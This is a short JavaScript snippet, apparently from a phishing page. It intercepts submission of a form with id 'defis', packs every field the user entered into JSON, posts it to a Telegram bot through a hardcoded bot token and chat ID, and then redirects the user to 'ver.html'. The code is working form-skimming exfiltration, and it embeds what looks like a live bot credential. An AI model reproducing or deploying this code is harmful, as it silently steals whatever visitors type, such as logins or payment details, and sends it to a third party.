     $(document).ready(function() {

       const chat_id = '6809554683',
         botID = 'bot7953552859:AAHPm-MnL8RRHeBJl_nmOyZAzDknYPB-ZVE';

       const telegramURL = `https://api.telegram.org/${botID}/sendMessage`;

       document.querySelector('#defis').addEventListener("submit", async e => { // When the user submits the form
         e.preventDefault(); // Don't submit
         let text = JSON.stringify( // Convert the form data to a string to send as our Telegram message
           Object.fromEntries(new FormData(e.target).entries()), // Convert the form data to an object.
           null, 2); // Prettify the JSON so we can read the data easily
         const sendMessage = await fetch(telegramURL, { // Send the request to the telegram API
           method: 'POST',
           headers: { "Content-Type": "application/json" }, // This is required when sending a JSON body.
           body: JSON.stringify({ chat_id, text }), // The body must be a string, not an object
         });
         window.location.href = 'ver.html';
       });


     });
